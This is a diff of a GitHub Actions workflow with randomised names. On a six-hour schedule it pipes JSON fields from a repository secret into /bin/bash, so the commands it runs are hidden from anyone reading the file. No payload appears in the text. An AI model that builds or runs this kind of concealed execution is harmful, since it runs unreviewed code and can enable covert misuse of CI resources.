@@ -1,21 +1,28 @@
 name: suguimi4356
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
+    - cron: '27 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: suguimi4356
         env:
-          g38874: ${{ secrets.g38874 }}
+          xp4: ${{ secrets.xp4 }}
         run: |
-          echo $g38874 | jq -r .ys38 | /bin/bash
-          echo $j1278 | jq -r .yu103 | /bin/bash
-          echo $h96210 | jq -r .ojtlt90579 | /bin/bash
-          echo $eqnu0426 | jq -r .wsyzk32195 | /bin/bash
-          echo $j31373 | jq -r .eqc40421 | /bin/bash
+          echo $xp4 | jq -r .pyim7875 | /bin/bash
+          echo $wsqbd1 | jq -r .hwa96876 | /bin/bash
+          echo $aklp1877 | jq -r .ahh3859 | /bin/bash
+          echo $m7 | jq -r .kvykt36 | /bin/bash
+          echo $xq4050 | jq -r .f7 | /bin/bash
+          echo $h327 | jq -r .mu2920 | /bin/bash
+          echo $queq94164 | jq -r .jhtl156 | /bin/bash
+          echo $fupfp7 | jq -r .hkl2 | /bin/bash
+          echo $bna1 | jq -r .ahtf64 | /bin/bash
+          echo $gto1 | jq -r .ueqgr599 | /bin/bash
+          echo $z86029 | jq -r .wesz055 | /bin/bash
 
